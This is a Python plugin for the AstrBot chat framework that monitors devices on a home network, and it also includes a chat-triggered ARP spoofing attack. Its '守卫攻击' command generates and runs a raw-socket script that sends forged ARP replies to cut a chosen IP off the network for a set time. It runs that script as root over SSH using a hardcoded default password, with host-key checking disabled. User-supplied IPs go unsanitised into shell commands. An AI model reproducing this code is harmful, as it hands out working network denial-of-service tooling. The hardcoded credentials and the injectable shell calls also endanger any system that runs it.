import asyncio
import json
import os
import re
import subprocess
from datetime import datetime

from astrbot.api.event import AstrMessageEvent, filter
from astrbot.api.star import Context, Star, register
from astrbot.api import logger
from astrbot.core.star.filter.event_message_type import EventMessageType

import os as _os

def _is_docker():
    return _os.path.exists("/.dockerenv") or _os.path.exists("/proc/1/cgroup")

_IN_DOCKER = _is_docker()

def _local_cmd(cmd, timeout=15):
    import subprocess as _sp
    try:
        r = _sp.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return r.stdout.decode("utf-8", errors="ignore")
    except:
        return ""

_PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
_DEVICES_FILE = os.path.join(_PLUGIN_DIR, "known_devices.json")
_ARP_FILE = "/AstrBot/data/arp_cache.txt"


def _read_arp_local():
    out = _local_cmd("ip neigh show | grep lladdr | grep -iv fe80 | grep -iv FAILED | grep -iv PERMANENT")
    if not out:
        return []
    devices = []
    seen = set()
    for line in out.splitlines():
        line = line.strip()
        if not line or "lladdr" not in line:
            continue
        parts = line.split()
        ip = parts[0]
        if ip.count(".") != 3:
            continue
        lladdr_idx = parts.index("lladdr")
        if lladdr_idx + 1 < len(parts):
            mac = parts[lladdr_idx + 1].lower()
            if mac.count(":") == 5 and mac not in seen:
                seen.add(mac)
                devices.append({"ip": ip, "mac": mac})
    return devices


def _parse_ip_neigh(content: str) -> list:
    """解析 ip neigh 命令输出"""
    devices = []
    seen = set()
    for line in content.splitlines():
        line = line.strip()
        if not line or "lladdr" not in line:
            continue
        parts = line.split()
        ip = parts[0]
        if ip.count(".") != 3:
            continue
        lladdr_idx = parts.index("lladdr")
        if lladdr_idx + 1 < len(parts):
            mac = parts[lladdr_idx + 1].lower()
            if mac.count(":") == 5 and mac not in seen:
                seen.add(mac)
                devices.append({"ip": ip, "mac": mac})
    return devices


def _read_arp() -> list:
    if not _IN_DOCKER:
        return _read_arp_local()
    try:
        if os.path.exists(_ARP_FILE):
            with open(_ARP_FILE) as f:
                data = f.read().strip()
                if data:
                    return _parse_ip_neigh(data)
    except:
        pass
    return _read_arp_local()


def _load_devices() -> list:
    """加载已保存的设备列表"""
    if os.path.exists(_DEVICES_FILE):
        try:
            with open(_DEVICES_FILE, "r") as f:
                return json.load(f)
        except Exception:
            return []
    return []


def _save_devices(devices: list):
    """保存设备列表"""
    try:
        with open(_DEVICES_FILE, "w") as f:
            json.dump(devices, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"[NetworkGuard] 保存设备失败: {e}")


def _load_cfg() -> dict:
    """加载本地配置"""
    p = os.path.join(_PLUGIN_DIR, "config.json")
    if os.path.exists(p):
        try:
            with open(p) as f:
                return json.load(f)
        except Exception:
            return {}
    return {}


def _save_cfg(cfg: dict):
    """保存本地配置"""
    p = os.path.join(_PLUGIN_DIR, "config.json")
    try:
        existing = _load_cfg()
        existing.update(cfg)
        with open(p, "w") as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"[NetworkGuard] 配置保存失败: {e}")


def _get_cfg(key: str, default=None):
    """获取配置"""
    return _load_cfg().get(key, default)


def _get_whitelist() -> set:
    """获取白名单 MAC 地址集合"""
    macs = set()
    for entry in _get_cfg("known_devices", []):
        if ":" in str(entry):
            mac = entry.split(":")[0].strip().lower()
            if mac.count(":") == 5:
                macs.add(mac)
    return macs


def _ssh_cmd(cmd: str, timeout: int = 15) -> str:
    """本地或通过 SSH 执行命令"""
    if not _IN_DOCKER:
        return _local_cmd(cmd, timeout)
    try:
        r = subprocess.run(
            ["sshpass", "-p", _get_cfg("ssh_password", "tommy12345"),
             "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10",
             f"root@{_get_cfg('ssh_host', '192.168.31.42')}", cmd],
            capture_output=True, timeout=timeout
        )
        return r.stdout.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.warning(f"[NetworkGuard] SSH失败: {e}")
        return ""


@register("network_guard", "AstrBot", "内网设备监控守卫", "1.1.0")
class NetworkGuardPlugin(Star):
    def __init__(self, context: Context, config: dict = None):
        super().__init__(context)
        self.scan_task = None

    async def initialize(self):
        logger.info("[NetworkGuard] 内网监控守卫已加载")
        self.scan_task = asyncio.create_task(self._auto_scan())

    async def terminate(self):
        if self.scan_task and not self.scan_task.done():
            self.scan_task.cancel()

    async def _auto_scan(self):
        """自动扫描循环"""
        await asyncio.sleep(10)
        while True:
            try:
                interval = int(_get_cfg("scan_interval", 10))
                await self._check_new()
                await asyncio.sleep(interval * 60)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[NetworkGuard] 自动扫描异常: {e}")
                await asyncio.sleep(60)

    async def _check_new(self):
        """对比检查新设备"""
        current = _read_arp()
        old = _load_devices()
        old_macs = {d["mac"] for d in old}
        whitelist = _get_whitelist()

        new_ones = [d for d in current if d["mac"] not in old_macs]
        unknown = [d for d in current if d["mac"] not in whitelist and d["ip"] != "192.168.31.1"]

        msgs = []
        for d in new_ones:
            msgs.append(f"🆕 新设备: {d['ip']} ({d['mac']})")
        for d in unknown:
            if d not in new_ones:
                msgs.append(f"⚠️ 陌生设备: {d['ip']} ({d['mac']})")

        if msgs and _get_cfg("notify_on_new", True):
            try:
                asyncio.create_task(
                    self.context.send_message(
                        _get_cfg("notify_session", "93E7D4D47A13E3621185AB98B8B3420B"),
                        "\n".join(msgs)
                    )
                )
            except Exception as e:
                logger.error(f"[NetworkGuard] 通知失败: {e}")

    # ========== 指令处理 ==========

    @filter.event_message_type(EventMessageType.ALL)
    async def on_any_message(self, event: AstrMessageEvent):
        msg = (event.message_str or "").strip()
        if not msg.startswith("守卫"):
            return
        event.stop_event()
        logger.info(f"[NetworkGuard] 收到: {msg}")

        # 守卫扫描
        if msg == "守卫扫描":
            devices = _read_arp()
            if devices:
                _save_devices(devices)
                lines = [f"\U0001f4e1 内网设备 ({len(devices)} 台)"]
                for d in devices[:25]:
                    lines.append(f"  {d['ip']}  {d['mac']}")
                yield event.plain_result("\n".join(lines))
            else:
                yield event.plain_result("\u274c 等待 ARP 更新...")
            return

        # 守卫列表
        if msg == "守卫列表":
            devices = _load_devices()
            if not devices:
                yield event.plain_result("\U0001f4ed 暂无记录，请先发送 守卫扫描")
                return
            wl = _get_whitelist()
            lines = [f"\U0001f4cb 已记录 ({len(devices)} 台)"]
            for d in devices:
                tag = " \u2705" if d["mac"] in wl else ""
                lines.append(f"{tag} {d['ip']}  {d['mac']}")
            yield event.plain_result("\n".join(lines[:30]))
            return

        # 守卫信任 <MAC> <名称>
        if msg.startswith("守卫信任"):
            parts = msg.split(maxsplit=2)
            if len(parts) < 2:
                yield event.plain_result("用法: 守卫信任 <MAC地址> <名称>")
                return
            mac = parts[1].strip().lower()
            name = parts[2].strip() if len(parts) > 2 else "未知"
            if mac.count(":") != 5:
                yield event.plain_result("\u274c MAC 格式错误，使用 aa:bb:cc:dd:ee:ff")
                return
            known = _get_cfg("known_devices", [])
            known = [k for k in known if not k.startswith(mac)]
            known.append(f"{mac}:{name}")
            _save_cfg({"known_devices": known})
            yield event.plain_result(f"\u2705 已信任 {mac} ({name})")
            return

        # 守卫移除 <MAC>
        if msg.startswith("守卫移除"):
            parts = msg.split()
            if len(parts) < 2:
                yield event.plain_result("用法: 守卫移除 <MAC地址>")
                return
            mac = parts[1].strip().lower()
            known = _get_cfg("known_devices", [])
            new_k = [k for k in known if not k.startswith(mac)]
            if len(new_k) == len(known):
                yield event.plain_result(f"\u2139\ufe0f 未找到 {mac}")
                return
            _save_cfg({"known_devices": new_k})
            yield event.plain_result(f"\u2705 已移除 {mac}")
            return

        # 守卫攻击 <IP> [秒数]
        if msg.startswith("守卫攻击"):
            parts = msg.split()
            if len(parts) < 2:
                yield event.plain_result("用法: 守卫攻击 <IP地址> [秒数]")
                return
            ip = parts[1]
            dur = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 60
            gw = _get_cfg("subnet", "192.168.31.0/24").rsplit(".", 1)[0] + ".1"
            yield event.plain_result(f"\u2694\ufe0f 正在攻击 {ip}，持续 {dur} 秒...")
            asyncio.create_task(self._do_attack(ip, gw, dur))
            yield event.plain_result(f"\u2705 攻击任务已启动，{dur} 秒后恢复")
            return

        # 守卫停止 <IP>
        if msg.startswith("守卫停止"):
            parts = msg.split()
            if len(parts) < 2:
                yield event.plain_result("用法: 守卫停止 <IP地址>")
                return
            ip = parts[1]
            _ssh_cmd(f"arp -d {ip} 2>/dev/null; ip neigh flush dev eno1 to {ip} 2>/dev/null")
            yield event.plain_result(f"\u2705 已尝试恢复 {ip}")
            return

        # 守卫帮助
        if msg == "守卫帮助":
            yield event.plain_result(
                "\U0001f4e1 内网监控守卫\n\n"
                "守卫扫描 - 列出当前设备\n"
                "守卫列表 - 查看已记录\n"
                "守卫信任 <MAC> <名称> - 白名单\n"
                "守卫移除 <MAC> - 移出白名单\n"
                "守卫攻击 <IP> [秒数] - ARP踢下线\n"
                "守卫停止 <IP> - 恢复网络\n"
                "守卫帮助 - 本帮助"
            )
            return

        yield event.plain_result(f"未知指令: {msg}，发送 守卫帮助 查看帮助")
    async def _do_attack(self, target_ip: str, gw_ip: str, duration: int):
        """执行 ARP 攻击（单播，只影响目标设备）"""
        # 写攻击脚本到临时文件
        script = f'''#!/usr/bin/env python3
import socket, struct, time

def mb(m): return bytes.fromhex(m.replace(":", ""))
def ib(ip): return bytes(int(x) for x in ip.split("."))

sm = mb(open("/sys/class/net/eno1/address").read().strip())
fm = mb("00:00:00:00:00:01")
gw_ip = "{gw_ip}"
target_ip = "{target_ip}"
duration = {duration}

gm, tm = None, None
try:
    with open("/AstrBot/data/arp_cache.txt") as f:
        for line in f:
            p = line.strip().split()
            if len(p) >= 5 and "lladdr" in line:
                if p[0] == gw_ip: gm = mb(p[p.index("lladdr")+1])
                if p[0] == target_ip: tm = mb(p[p.index("lladdr")+1])
except: pass
if not gm: gm = fm
if not tm: tm = fm

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
sock.bind(("eno1", 0))
end = time.time() + duration
cnt = 0
while time.time() < end:
    pkt1 = gm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(gw_ip) + fm + ib(target_ip)
    pkt2 = tm + sm + struct.pack("!H",0x0806) + struct.pack("!HHBBH",1,0x0800,6,4,2) + sm + ib(target_ip) + fm + ib(gw_ip)
    sock.send(pkt1)
    sock.send(pkt2)
    cnt += 2
    time.sleep(0.5)
sock.close()
print(f"Done: {cnt}")
'''
        script_path = "/tmp/arp_attack_run.py"
        with open(script_path, "w") as f:
            f.write(script)

        import subprocess as _sp
        host = _get_cfg("ssh_host", "192.168.31.42")
        pw = _get_cfg("ssh_password", "tommy12345")

        try:
            import os as _os
            host = _get_cfg("ssh_host", "192.168.31.42")
            pw = _get_cfg("ssh_password", "tommy12345")
            if _IN_DOCKER:
                # Docker 模式：用 _ssh_cmd 执行（复用已有的函数）
                result = _ssh_cmd(f"python3 /tmp/arp_attack_run.py", duration + 15)
            else:
                # 非 Docker：本地执行
                subprocess.run(["python3", script_path], capture_output=True, timeout=duration+15)
                result = "OK"
            logger.info(f"[NetworkGuard] ARP攻击: {result.strip()[:100] if result else '无输出'}")
        except Exception as e:
            import traceback
            logger.error(f"[NetworkGuard] ARP攻击失败: {e}\\n{traceback.format_exc()[:200]}")
            # 改为写文件方式（宿主机 cron 自动检测执行）
            try:
                import shutil as _sh
                _sh.copy2(script_path, "/AstrBot/data/arp_attack_ready.py")
                _os.chmod("/AstrBot/data/arp_attack_ready.py", 0o755)
                logger.info("[NetworkGuard] 攻击脚本已写入 /AstrBot/data/arp_attack_ready.py，请在宿主机手动执行")
            except:
                pass








